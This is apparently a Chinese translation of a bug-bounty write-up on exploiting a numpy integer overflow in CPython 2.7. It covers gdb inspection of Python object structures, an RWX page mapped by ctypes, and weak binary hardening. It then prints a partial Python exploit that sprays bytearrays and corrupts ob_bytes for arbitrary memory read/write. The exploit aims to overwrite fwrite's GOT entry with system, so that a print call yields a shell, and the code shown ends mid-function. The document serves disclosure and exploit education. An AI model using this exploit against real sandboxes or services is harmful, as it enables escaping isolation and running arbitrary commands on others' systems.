+&nbsp;&nbsp;‘0x7ffff7e777b0’</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">实际上在应用程序中，开发人员应确保不向用户公开id(object) 。 在沙盒化的环境中，除了可以将列表id或重新实现id以返回哈希之外，还可以做很多事情。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">了解内存分配行为</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">了解您的分配器对于编写漏洞利用脚本至关重要。 Python具有基于对象类型和大小的不同分配策略。 我们来看看我们的大字符串0xa52cd0，小字符串0x7ffff7f65848和numpy数组0x7ffff7e777b0。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;cat&nbsp;/proc/`pgrep&nbsp;python`/maps&nbsp;
+00400000–006ea000&nbsp;r-xp&nbsp;00000000&nbsp;08:01&nbsp;2712&nbsp;/usr/bin/python2.7
+008e9000–008eb000&nbsp;r&nbsp;—&nbsp;p&nbsp;002e9000&nbsp;08:01&nbsp;2712&nbsp;/usr/bin/python2.7
+008eb000–00962000&nbsp;rw-p&nbsp;002eb000&nbsp;08:01&nbsp;2712&nbsp;/usr/bin/python2.7
+00962000–00fa8000&nbsp;rw-p&nbsp;00000000&nbsp;00:00&nbsp;0&nbsp;[heap]&nbsp;&nbsp;#&nbsp;big&nbsp;string
+...
+7ffff7e1d000–7ffff7edd000&nbsp;rw-p&nbsp;00000000&nbsp;00:00&nbsp;0&nbsp;#&nbsp;numpy&nbsp;array
+...
+7ffff7f0e000–7ffff7fd3000&nbsp;rw-p&nbsp;00000000&nbsp;00:00&nbsp;0&nbsp;#&nbsp;small&nbsp;string</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">字符串在常规堆中。 小字符串和numpy数组位于单独的mmap区域中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Python对象结构</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">泄漏和破坏Python对象元数据可能相当强大，因此了解Python对象的表示方式很有用。 在封面下，Python对象都派生自PyObject ，这是一个包含引用计数和对象实际类型描述符的结构。 值得注意的是，类型描述符包含许多字段，包括可能对读取或覆盖有用的函数指针。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们先检查我们在前一节中创建的小字符串。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">(gdb)&nbsp;print&nbsp;*(PyObject&nbsp;*)0x7ffff7f65848
+$2&nbsp;=&nbsp;{ob_refcnt&nbsp;=&nbsp;1,&nbsp;ob_type&nbsp;=&nbsp;0x9070a0&nbsp;&lt;PyString_Type&gt;}
+(gdb)&nbsp;print&nbsp;*(PyStringObject&nbsp;*)0x7ffff7f65848
+$3&nbsp;=&nbsp;{ob_refcnt&nbsp;=&nbsp;1,&nbsp;ob_type&nbsp;=&nbsp;0x9070a0&nbsp;&lt;PyString_Type&gt;,&nbsp;ob_size&nbsp;=&nbsp;256,&nbsp;ob_shash&nbsp;=&nbsp;-1,&nbsp;ob_sstate&nbsp;=&nbsp;0,&nbsp;ob_sval&nbsp;=&nbsp;“A”}
+(gdb)&nbsp;x/s&nbsp;((PyStringObject&nbsp;*)0x7ffff7f65848)-&gt;ob_sval
+0x7ffff7f6586c:&nbsp;‘A’&nbsp;&lt;repeats&nbsp;200&nbsp;times&gt;...
+(gdb)&nbsp;ptype&nbsp;PyString_Type&nbsp;
+type&nbsp;=&nbsp;struct&nbsp;_typeobject&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;Py_ssize_t&nbsp;ob_refcnt;
+&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;_typeobject&nbsp;*ob_type;
+&nbsp;&nbsp;&nbsp;&nbsp;Py_ssize_t&nbsp;ob_size;
+&nbsp;&nbsp;&nbsp;&nbsp;const&nbsp;char&nbsp;*tp_name;
+&nbsp;&nbsp;&nbsp;&nbsp;Py_ssize_t&nbsp;tp_basicsize;
+&nbsp;&nbsp;&nbsp;&nbsp;Py_ssize_t&nbsp;tp_itemsize;
+&nbsp;&nbsp;&nbsp;&nbsp;destructor&nbsp;tp_dealloc;
+&nbsp;&nbsp;&nbsp;&nbsp;printfunc&nbsp;tp_print;
+&nbsp;&nbsp;&nbsp;&nbsp;getattrfunc&nbsp;tp_getattr;
+&nbsp;&nbsp;&nbsp;&nbsp;setattrfunc&nbsp;tp_setattr;
+&nbsp;&nbsp;&nbsp;&nbsp;cmpfunc&nbsp;tp_compare;
+&nbsp;&nbsp;&nbsp;&nbsp;reprfunc&nbsp;tp_repr;
+&nbsp;&nbsp;&nbsp;&nbsp;PyNumberMethods&nbsp;*tp_as_number;
+&nbsp;&nbsp;&nbsp;&nbsp;PySequenceMethods&nbsp;*tp_as_sequence;
+&nbsp;&nbsp;&nbsp;&nbsp;PyMappingMethods&nbsp;*tp_as_mapping;
+&nbsp;&nbsp;&nbsp;&nbsp;hashfunc&nbsp;tp_hash;
+&nbsp;&nbsp;&nbsp;&nbsp;ternaryfunc&nbsp;tp_call;
+&nbsp;&nbsp;&nbsp;&nbsp;reprfunc&nbsp;tp_str;
+&nbsp;&nbsp;&nbsp;&nbsp;getattrofunc&nbsp;tp_getattro;
+&nbsp;&nbsp;&nbsp;&nbsp;setattrofunc&nbsp;tp_setattro;
+&nbsp;&nbsp;&nbsp;&nbsp;PyBufferProcs&nbsp;*tp_as_buffer;
+&nbsp;&nbsp;&nbsp;&nbsp;long&nbsp;tp_flags;
+&nbsp;&nbsp;&nbsp;&nbsp;const&nbsp;char&nbsp;*tp_doc;
+&nbsp;&nbsp;&nbsp;&nbsp;traverseproc&nbsp;tp_traverse;
+&nbsp;&nbsp;&nbsp;&nbsp;inquiry&nbsp;tp_clear;
+&nbsp;&nbsp;&nbsp;&nbsp;richcmpfunc&nbsp;tp_richcompare;
+&nbsp;&nbsp;&nbsp;&nbsp;Py_ssize_t&nbsp;tp_weaklistoffset;
+&nbsp;&nbsp;&nbsp;&nbsp;getiterfunc&nbsp;tp_iter;
+&nbsp;&nbsp;&nbsp;&nbsp;iternextfunc&nbsp;tp_iternext;
+&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;PyMethodDef&nbsp;*tp_methods;
+&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;PyMemberDef&nbsp;*tp_members;
+&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;PyGetSetDef&nbsp;*tp_getset;
+&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;_typeobject&nbsp;*tp_base;
+&nbsp;&nbsp;&nbsp;&nbsp;PyObject&nbsp;*tp_dict;
+&nbsp;&nbsp;&nbsp;&nbsp;descrgetfunc&nbsp;tp_descr_get;
+&nbsp;&nbsp;&nbsp;&nbsp;descrsetfunc&nbsp;tp_descr_set;
+&nbsp;&nbsp;&nbsp;&nbsp;Py_ssize_t&nbsp;tp_dictoffset;
+&nbsp;&nbsp;&nbsp;&nbsp;initproc&nbsp;tp_init;
+&nbsp;&nbsp;&nbsp;&nbsp;allocfunc&nbsp;tp_alloc;
+&nbsp;&nbsp;&nbsp;&nbsp;newfunc&nbsp;tp_new;
+&nbsp;&nbsp;&nbsp;&nbsp;freefunc&nbsp;tp_free;
+&nbsp;&nbsp;&nbsp;&nbsp;inquiry&nbsp;tp_is_gc;
+&nbsp;&nbsp;&nbsp;&nbsp;PyObject&nbsp;*tp_bases;
+&nbsp;&nbsp;&nbsp;&nbsp;PyObject&nbsp;*tp_mro;
+&nbsp;&nbsp;&nbsp;&nbsp;PyObject&nbsp;*tp_cache;
+&nbsp;&nbsp;&nbsp;&nbsp;PyObject&nbsp;*tp_subclasses;
+&nbsp;&nbsp;&nbsp;&nbsp;PyObject&nbsp;*tp_weaklist;
+&nbsp;&nbsp;&nbsp;&nbsp;destructor&nbsp;tp_del;
+&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;int&nbsp;tp_version_tag;
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">许多有用的字段读取或写入类型的指针，函数指针，数据指针，大小等等。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Shellcode like it&#39;s 1999</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">ctypes库作为Python和C代码之间的桥梁。 它提供C兼容的数据类型，并允许在DLL或共享库中调用函数。 许多具有C绑定或需要调用共享库的模块需要导入ctypes。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我注意到，导入ctypes会导致以读/写/执行权限设置的4K大小的内存区域映射。 如果还不明显，这意味着攻击者甚至不需要编写一个ROP链。 利用一个错误就像把指令指针指向你的shellcode一样简单，你被授予你已经找到了RWX区域。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;cat&nbsp;foo.py
+import&nbsp;ctypes
+while&nbsp;True:&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;pass
+$&nbsp;python&nbsp;foo.py
+^Z
+[2]&nbsp;+&nbsp;30567&nbsp;suspended&nbsp;python&nbsp;foo.py
+$&nbsp;grep&nbsp;rwx&nbsp;/proc/30567/maps7fcb806d5000–7fcb806d6000&nbsp;rwxp&nbsp;00000000&nbsp;00:00&nbsp;0</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">进一步调查，我发现libffi的封闭API 负责打印RWX区域。 但是，该区域不能在某些平台上分配RWX，例如启用了selinux强制或PAX mprotect的系统，并且有代码可以解决这个限制。我没有花太多时间尝试可靠地定位RWX映射，但是从理论上说，如果你有一个任意读取的exploit，应该是可能的。 当ASLR应用于库（library）时，动态链接器以可预测的顺序映射库（library）的区域。 库（library）的地区包括库私有的全局变量和代码本身。Libffi将对RWX地区的引用存储为全局。 例如，如果您在堆上找到指向libffi函数的指针，则可以将RWX区域指针的地址预先计算为与libffi函数指针的地址的偏移量。 每个库版本都需要调整偏移量。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">De facto exploit mitigations</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我在Ubuntu 14.04.5和16.04.1上测试了Python2.7二进制程序的安全相关编译器标志。 有几个弱点，对攻击者来说是非常有用的：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Partial RELRO：可执行文件的GOT部分 ，包含动态链接到二进制文件中的库函数的指针，是可写的。 例如，explolo可以用system()替换printf()的地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">No PIE：二进制文件不是与位置无关的可执行文件，这意味着当内核将ASLR应用于大多数内存映射时，二进制本身的内容将映射到静态地址。 由于GOT部分是二进制文件的一部分，因此PIE不会使攻击者更容易找到并写入GOT。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Road blocks</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">虽然CPython是充分利用开发人员工具的环境，但有一些力量破坏了我的许多漏洞尝试，难以调试</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">垃圾收集器，类型系统以及可能的其他未知的力将破坏您的漏洞利用，如果您不小心克隆对象元数据。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">id()可能不可靠。 由于我无法确定，Python有时会在使用始对象时传递对象的副本。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">对象分配的区域有些不可预测。 由于我无法确定，某些编码模式导致缓冲区被分配到brk堆中，而其他模式导致在一个python特定的mmap&#39;d堆中分配。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">漏洞利用</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">发现numpy整数溢出后不久，我向Bug的一个报告提交了劫持指令指针的概念证明，但没有注入任何代码。 当我最初提交时，我没有意识到PoC实际上是不可靠的，并且我无法对其服务器进行正确的测试，因为验证劫持指令指针需要访问核心转储或调试器。 供应商承认这个问题的合法性，但是比起我的第一份报告，他们给了一个不那么慷慨的回报。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">很公平！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我不是一个漏洞利用开发者，但我挑战自己做得更好。 经过多次尝试和错误，我最终写了一个似乎是可靠的漏洞。 不幸的是，我无法在供应商的沙箱中测试它，因为在完成之前更新了numpy，但是在Python解释器中本地测试时它的工作正常。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在高层次上，漏洞利用一个numpy数组的大小来获取任意的读/写漏洞利用的攻击。这个攻击用于将system的地址写入fwrite的GOT / PLT条目。 最后，Python的内置print调用fwrite覆盖，所以现在你可以调用print &#39;/bin/sh&#39;来获取shell，或者用任何命令替换/ bin / sh。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">有一些比高级别的解释更多，所以请查看下面的漏洞。 我建议从自下而上开始阅读，包括评论。 如果您使用的是不同版本的Python，请在运行该文件之前调整fwrite和system的GOT位置。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">import&nbsp;numpy&nbsp;as&nbsp;np
+#&nbsp;addr_to_str&nbsp;is&nbsp;a&nbsp;quick&nbsp;and&nbsp;dirty&nbsp;replacement&nbsp;for&nbsp;struct.pack(),&nbsp;needed
+#&nbsp;for&nbsp;sandbox&nbsp;environments&nbsp;that&nbsp;block&nbsp;the&nbsp;struct&nbsp;module.
+def&nbsp;addr_to_str(addr):
+&nbsp;&nbsp;&nbsp;&nbsp;addr_str&nbsp;=&nbsp;&quot;%016x&quot;&nbsp;%&nbsp;(addr)
+&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;=&nbsp;str()
+&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(16,&nbsp;0,&nbsp;-2):
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;=&nbsp;ret&nbsp;+&nbsp;addr_str[i-2:i].decode(&#39;hex&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;ret
+#&nbsp;read_address&nbsp;and&nbsp;write_address&nbsp;use&nbsp;overflown&nbsp;numpy&nbsp;arrays&nbsp;to&nbsp;search&nbsp;for
+#&nbsp;bytearray&nbsp;objects&nbsp;we&#39;ve&nbsp;sprayed&nbsp;on&nbsp;the&nbsp;heap,&nbsp;represented&nbsp;as&nbsp;a&nbsp;PyByteArray
+#&nbsp;structure:
+#&nbsp;
+#&nbsp;struct&nbsp;PyByteArray&nbsp;{
+#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Py_ssize_t&nbsp;ob_refcnt;
+#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;_typeobject&nbsp;*ob_type;
+#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Py_ssize_t&nbsp;ob_size;
+#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;ob_exports;
+#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Py_ssize_t&nbsp;ob_alloc;
+#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*ob_bytes;
+#&nbsp;};
+#&nbsp;
+#&nbsp;Once&nbsp;located,&nbsp;the&nbsp;pointer&nbsp;to&nbsp;actual&nbsp;data&nbsp;`ob_bytes`&nbsp;is&nbsp;overwritten&nbsp;with&nbsp;the
+#&nbsp;address&nbsp;that&nbsp;we&nbsp;want&nbsp;to&nbsp;read&nbsp;or&nbsp;write.&nbsp;We&nbsp;then&nbsp;cycle&nbsp;through&nbsp;the&nbsp;list&nbsp;of&nbsp;byte
+#&nbsp;arrays&nbsp;until&nbsp;we&nbsp;find&nbsp;the&nbsp;&nbsp;one&nbsp;that&nbsp;has&nbsp;been&nbsp;corrupted.&nbsp;This&nbsp;bytearray&nbsp;is&nbsp;used
+#&nbsp;to&nbsp;read&nbsp;or&nbsp;write&nbsp;the&nbsp;desired&nbsp;location.&nbsp;Finally,&nbsp;we&nbsp;clean&nbsp;up&nbsp;by&nbsp;setting
+#&nbsp;`ob_bytes`&nbsp;back&nbsp;to&nbsp;its&nbsp;original&nbsp;value.
+def&nbsp;find_address(addr,&nbsp;data=None):
+&nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;=&nbsp;0
+&nbsp;&nbsp;&nbsp;&nbsp;j&nbsp;=&nbsp;-1
+&nbsp;&nbsp;&nbsp;&nbsp;k&nbsp;=&nbsp;0
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;data:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;size&nbsp;=&nbsp;0x102
+&nbsp;&nbsp;&nbsp;&nbsp;else:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;size&nbsp;=&nbsp;0x103
+&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;k,&nbsp;arr&nbsp;in&nbsp;enumerate(arrays):
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;=&nbsp;0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(0x2000):&nbsp;#&nbsp;0x2000&nbsp;is&nbsp;a&nbsp;value&nbsp;that&nbsp;happens&nbsp;to&nbsp;work
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Here&nbsp;we&nbsp;search&nbsp;for&nbsp;the&nbsp;signature&nbsp;of&nbsp;a&nbsp;PyByteArray&nbsp;structure
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j&nbsp;=&nbsp;arr[0][i].find(addr_to_str(0x1))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ob_refcnt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(j&nbsp;&lt;&nbsp;0&nbsp;or
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arr[0][i][j+0x10:j+0x18]&nbsp;!=&nbsp;addr_to_str(size)&nbsp;or&nbsp;&nbsp;#&nbsp;ob_size
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arr[0][i][j+0x20:j+0x28]&nbsp;!=&nbsp;addr_to_str(size+1)):&nbsp;#&nbsp;ob_alloc
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;idx_bytes&nbsp;=&nbsp;j+0x28&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ob_bytes
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Save&nbsp;an&nbsp;unclobbered&nbsp;copy&nbsp;of&nbsp;the&nbsp;bytearray&nbsp;metadata
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;saved_metadata&nbsp;=&nbsp;arrays[k][0][i]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Overwrite&nbsp;the&nbsp;ob_bytes&nbsp;pointer&nbsp;with&nbsp;the&nbsp;provded&nbsp;address
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr_string&nbsp;=&nbsp;addr_to_str(addr)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;new_metadata&nbsp;=&nbsp;(saved_metadata[0:idx_bytes]&nbsp;+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr_string&nbsp;+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;saved_metadata[idx_bytes+8:])
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arrays[k][0][i]&nbsp;=&nbsp;new_metadata
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;=&nbsp;None
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;bytearray_&nbsp;in&nbsp;bytearrays:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;We&nbsp;differentiate&nbsp;the&nbsp;signature&nbsp;by&nbsp;size&nbsp;for&nbsp;each
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;find_address&nbsp;invocation&nbsp;because&nbsp;we&nbsp;don&#39;t&nbsp;want&nbsp;to
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;accidentally&nbsp;clobber&nbsp;the&nbsp;wrong&nbsp;&nbsp;bytearray&nbsp;structure.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;We&nbsp;know&nbsp;we&#39;ve&nbsp;hit&nbsp;the&nbsp;structure&nbsp;we&#39;re&nbsp;looking&nbsp;for&nbsp;if
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;the&nbsp;size&nbsp;matches&nbsp;and&nbsp;it&nbsp;contents&nbsp;do&nbsp;not&nbsp;equal&nbsp;&#39;XXXXXXXX&#39;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(bytearray_)&nbsp;==&nbsp;size&nbsp;and&nbsp;bytearray_[0:8]&nbsp;!=&nbsp;&#39;XXXXXXXX&#39;:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;data:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bytearray_[0:8]&nbsp;=&nbsp;data&nbsp;#&nbsp;write&nbsp;memory
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;=&nbsp;bytearray_[0:8]&nbsp;#&nbsp;read&nbsp;memory
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;restore&nbsp;the&nbsp;original&nbsp;PyByteArray-&gt;ob_bytes
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arrays[k][0][i]&nbsp;=&nbsp;saved_metadata
